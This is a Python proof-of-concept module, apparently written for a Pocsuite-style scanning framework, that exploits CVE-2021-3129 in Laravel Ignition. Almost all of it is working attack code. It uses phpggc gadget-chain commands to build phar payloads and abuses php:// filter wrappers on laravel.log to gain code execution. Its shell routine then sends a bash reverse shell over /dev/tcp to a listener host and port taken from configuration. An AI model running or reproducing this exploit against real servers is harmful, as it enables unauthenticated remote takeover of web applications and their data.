from Framework.Library.Function.Function.PocSuite.lib.core.common import generate_dll
import json
from Framework.Valueconfig import FORMATTIME, ValueStatus
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse
import datetime
import random
import string
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths, get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests 
import sys, os
import re
from configvalue import * 

class DemoPOC(POCBase):
    vulID = 'CVE-2021-3129'  # ssvid
    version = '1.0'
    author = ['parisk']
    vulDate = '12/01/2021'
    createDate = '2021/04/06'
    updateDate = '2021/04/06'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2021-3129']
    name = 'Laravel Ignition - Version < 2.5.2 - Command injection'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.JAVA], 
                "vul_type": VUL_TYPE.CODE_EXECUTION}
    appName = 'LaravelIgnition-cve-2021-3129'
    appVersion = 'CVE-2021-3129'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}
    __gadget_chains = {
        "Laravel/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE3":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE4":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE5":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('id');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE6":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system('id');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE7":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE3":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE4":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
    }
    path=""; 
    def run_wrapper(self,url, wrapper): 
        solution = "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"
        return requests.Session.post(
            url + '/_ignition/execute-solution/', 
            json={
                "solution": solution,
                "parameters": {
                    "viewFile": wrapper,
                    "variableName": "doesnotexist"
                }
            }
        )
    def get_laravel_log_path(self, url): 
        r = self.run_wrapper(url, "DOESNOTEXIST")
        match = re.search(r'"file":"(\\/[^"]+?)\\/vendor\\/[^"]+?"', r.text)
        if not match: 
            return  
        path = match.group(1).replace('\\/', '/')
        path = f'{path}/storage/logs/laravel.log'
        r = self.run_wrapper(url, path)
        if r.status_code != 200:
            return  
        else: 
            return path
    
    def clear_logs(self, url):
        wrapper = f'php://filter/read=consumed/resource={self.log_path}'
        self.run_wrapper(url, wrapper)
        return True

    def generate_payload(self, gadget_chain): 
        generate_exp = self.__gadget_chains[gadget_chain]
        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
        return exp

    def send_payload(self,url, payload): 
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        res = requests.post(url, headers=header, json=data, verify=False)
        return res

    def decode_log(self, url): 
        return self.send_payload(url, "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource="+self.log_path)

    def run_phar(self, url): 
        return self.send_payload(url, f"phar://{self.log_path}/test.txt")

    def _rce(self, url): 
        text = str(self.run_phar(url).text)
        text = text[text.index(']'):].replace("}","").replace("]","")
        if("uid=" in text) and ("gid=" in text) and ("groups=" in text): 
            return True
        else: 
            return False

    def laravel_rce(self, url): 
        if not self.log_path: 
            self.log_path = self.get_laravel_log_path(url)
        try: 
            for gadget_chain in self.__gadget_chains.keys(): 
                self.clear_logs(url)
                self.clear_logs(url)
                self.send_payload(url, 'A'*2)
                self.send_payload(url, self.generate_payload(gadget_chain))
                self.decode_log(url, self.log_path)
                result = self._rce(url)
                if result: 
                    self.clear_logs()
                    return [result,gadget_chain]
                else: 
                    continue
        except Exception : 
            pass
            
    def laravel_rce_shell(self, url, payload): 
        try:
            exp = "".join(os.popen(payload).readlines()).replace("\n","")+ 'a'
            self.clear_logs(url)
            self.clear_logs(url)
            self.send_payload(url, 'A'*2)
            self.send_payload(url, exp)
            self.decode_log(url, self.log_path)
            result = self._rce(url)
            return [result, exp]
        finally: 
            self.clear_logs(url)

    def _verify(self, update=True):
        if update:
            config_input,  self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        self.result_url = []
        self.log_path = ""
        for url in self.url:
            path = self.get_laravel_log_path(url)
            if path:
                try:
                    self.result_url.append(url)
                    self.log_path = path
                except Exception as e: 
                    logger.warn(str(e))
        if len(self.result_url ) > 0:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.result_url
                result['VerifyInfo']['path'] = path
        if update:
            return self.parse_output(result)
        else:
            return result

    def _attack(self):
        config_input,  self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
        try:
            self.url = config_input['Input']['RECON_WEBAPP']
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        self._verify(update=False)
        data_attack = []
        for url in self.result_url:
            try:
                laravel_rce_result, temp = self.laravel_rce(url)
                if laravel_rce_result: 
                    self.gadget_chain = temp
                    data_attack.append(url)
            except Exception as e:
                print(e)
        if len(data_attack) > 0:
            result = {}
            result['ShellInfo'] = {}
            result['ShellInfo']['url'] =  data_attack 
            result['ShellInfo']['gadget_chain'] = self.gadget_chain
            return self.parse_output(result)
        return self.parse_output(False)

    def _shell(self):
        #getdata input
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            print(self.headers['Referer'])
            config_input,  self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            #self._verify(update=False)
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            result['url'] = self.url
            cmd = "/bin/bash -c 'bash -i >&/dev/tcp/{}/{} 0>&1'".format(lhost_running, lport_running)
            payload = self.__gadget_chains[self.gadget_chain]
            if ("system('id')" in payload): 
                cmd = payload.replace('id', cmd.replace("'", '"'))
            else: 
                cmd=payload.replace("id", cmd)
            
            self.laravel_rce_shell(self.url, cmd)
            result['payload'] = cmd
            return self.parse_output(result)
        except  Exception as e:
            if type(e) == requests.exceptions.ReadTimeout:
                return self.parse_output(result)
            print("Error run shell", self.name, e)
            pass
        return self.parse_output(False)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)